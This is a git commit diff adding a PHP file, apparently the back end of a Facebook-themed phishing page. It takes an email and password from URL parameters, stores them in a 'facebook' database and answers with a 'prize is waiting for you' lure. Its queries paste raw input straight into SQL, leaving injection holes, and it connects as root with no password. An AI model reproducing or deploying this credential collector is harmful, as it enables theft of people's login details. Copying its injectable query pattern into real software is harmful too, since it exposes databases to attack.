de00ae1fb16be8e539fc28eaa8149453c240815a
Remon <shresthanewar678@gmail.com>
2022-11-19 16:16:15 +0545

    database

--- database.php
+++ database.php
@@ -1,3 +1,22 @@
 <?php
-$dbname = 
+$conn = mysqli_connect("localhost","root","","facebook");
+if($conn){
+    $email = $_GET["email"];
+    $password = $_GET["password"];
+    $sql1 = mysqli_query($conn,"SELECT `Password` FROM `details` WHERE Password = '$password'");
+    $sql = "INSERT INTO `details`(`Email or Phone Number`, `Password`) VALUES ('$email','$password')";
+    if(mysqli_num_rows($sql1)==0){
+        if(mysqli_query($conn,$sql)){
+            echo "your email and password has been saved.";
+        }
+        else{
+         echo "go back and try again. prize is waiting for you.";
+        }
+    }
+    else{ echo "already entered the value.";
+    }
+}
+else{
+    die("Connection Error!".mysqli_connect_error());
+}
 ?>
